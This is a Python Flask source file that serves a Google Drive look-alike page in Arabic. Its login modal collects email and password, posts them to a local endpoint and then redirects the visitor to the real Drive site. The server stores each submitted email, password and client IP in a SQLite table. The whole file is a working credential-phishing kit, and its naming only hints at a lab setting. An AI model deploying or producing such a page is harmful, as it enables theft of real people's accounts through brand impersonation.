from flask import Flask, request, jsonify
import sqlite3
import os

app = Flask(__name__)
DB_NAME = "local_lab_storage.db"

def init_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS session_logs (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
            email TEXT,
            password TEXT,
            client_ip TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

HTML_CODE = """<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ملفاتي - Google Drive</title>
    <style>
        :root {
            --g-bg: #f8f9fa;
            --g-surface: #ffffff;
            --g-text: #202124;
            --g-muted: #5f6368;
            --g-border: #dadce0;
            --g-primary: #1a73e8;
            --g-primary-hover: #1558b0;
            --g-sidebar-bg: #f8f9fa;
            --g-hover-bg: #f1f3f4;
            --g-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
        }
        *, *::before, *::after { box-sizing: border-box; }
        body {
            margin: 0;
            font-family: 'Google Sans', Roboto, Arial, sans-serif;
            color: var(--g-text);
            background-color: var(--g-surface);
            overflow: hidden;
        }
        .g-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            height: 64px;
            padding: 0 16px;
            border-bottom: 1px solid var(--g-border);
            background: var(--g-surface);
        }
        .g-logo-area {
            display: flex;
            align-items: center;
            gap: 12px;
            font-size: 22px;
            font-weight: 500;
            color: var(--g-muted);
        }
        .g-search-bar {
            display: flex;
            align-items: center;
            background: var(--g-bg);
            width: 600px;
            height: 48px;
            border-radius: 24px;
            padding: 0 16px;
            gap: 12px;
        }
        .g-search-bar input {
            border: none;
            background: transparent;
            outline: none;
            width: 100%;
            font-size: 16px;
            color: var(--g-text);
            text-align: right;
        }
        .g-main-layout { display: flex; height: calc(100vh - 64px); }
        .g-sidebar {
            width: 256px;
            background: var(--g-sidebar-bg);
            border-left: 1px solid var(--g-border);
            display: flex;
            flex-direction: column;
        }
        .g-new-btn {
            display: flex;
            align-items: center;
            gap: 12px;
            background: var(--g-surface);
            box-shadow: var(--g-shadow);
            padding: 6px 24px 6px 12px;
            border-radius: 28px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            margin: 16px;
            width: fit-content;
        }
        .g-nav-list { display: flex; flex-direction: column; padding: 0 12px; gap: 2px; }
        .g-nav-item {
            display: flex;
            align-items: center;
            gap: 16px;
            padding: 10px 16px;
            border-radius: 16px;
            text-decoration: none;
            color: var(--g-text);
            font-size: 14px;
        }
        .g-nav-item.active { background-color: #d3e3fd; color: #041e49; }
        .g-content { flex: 1; padding: 24px; background: var(--g-surface); overflow-y: auto; }
        .files-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 16px; }
        .file-card { border: 1px solid var(--g-border); border-radius: 8px; padding: 12px; background: var(--g-bg); }
        .modal-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.5); display: flex; align-items: center; justify-content: center; z-index: 1000;
        }
        .modal-card {
            background: #fff; padding: 32px; border-radius: 12px; width: 400px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.15); text-align: center;
        }
        .modal-card input {
            width: 100%; padding: 12px; margin: 8px 0; border: 1px solid var(--g-border); border-radius: 6px; outline: none;
        }
        .modal-card button {
            width: 100%; padding: 12px; background: var(--g-primary); color: white; border: none; border-radius: 6px; font-weight: 500; cursor: pointer; margin-top: 16px;
        }
    </style>
</head>
<body>
    <header class="g-header">
        <div class="g-logo-area">
            <svg width="32" height="32" viewBox="0 0 87.3 78"><path d="m6.6 66.85 11.15 19.35h32.15l-11.15-19.35z" fill="#0066da"/><path d="m49.9 86.2 11.15-19.35-21.45-37.15-11.15 19.35z" fill="#00ac47"/><path d="m80.7 29.7-11.15-19.35h-32.15l11.15 19.35z" fill="#ea4335"/><path d="m49.9 10.35-21.45 37.15 11.15 19.35 21.45-37.15z" fill="#ffba00"/></svg>
            <span>Drive</span>
        </div>
        <div class="g-search-bar"><input type="text" placeholder="البحث في محرك الأقراص"></div>
        <div></div>
    </header>
    <div class="g-main-layout">
        <div class="g-sidebar">
            <button class="g-new-btn"><span>جديد</span></button>
            <div class="g-nav-list"><a href="#" class="g-nav-item active"><span>ملفاتي</span></a></div>
        </div>
        <div class="g-content">
            <div class="files-grid"><div class="file-card">📁 مشروع التخرج 2026</div></div>
        </div>
    </div>
    <div class="modal-overlay" id="loginModal">
        <div class="modal-card">
            <h2>تسجيل الدخول إلى Google Drive</h2>
            <p style="font-size: 13px; color: #5f6368; margin-bottom: 20px;">الرجاء تأكيد الحساب للمتابعة</p>
            <form id="authForm">
                <input type="text" id="username" placeholder="البريد الإلكتروني أو الهاتف" required>
                <input type="password" id="password" placeholder="كلمة المرور" required>
                <button type="submit">التالي</button>
            </form>
        </div>
    </div>
    <script>
        document.getElementById('authForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            fetch('/api/auth', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: username, password: password })
            }).catch(err => console.error(err));

            window.location.href = "https://drive.google.com";
        });
    </script>
</body>
</html>"""

@app.route('/')
def index():
    return HTML_CODE

@app.route('/api/auth', methods=['POST'])
def handle_auth():
    data = request.get_json() or {}
    email = data.get('username', 'Unknown')
    password = data.get('password', 'Unknown')
    client_ip = request.remote_addr

    try:
        conn = sqlite3.connect(DB_NAME)
        cursor = conn.cursor()
        cursor.execute("INSERT INTO session_logs (email, password, client_ip) VALUES (?, ?, ?)", 
                       (email, password, client_ip))
        conn.commit()
        conn.close()
    except Exception as e:
        print(f"DB Error: {e}")

    return jsonify({"status": "success"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)

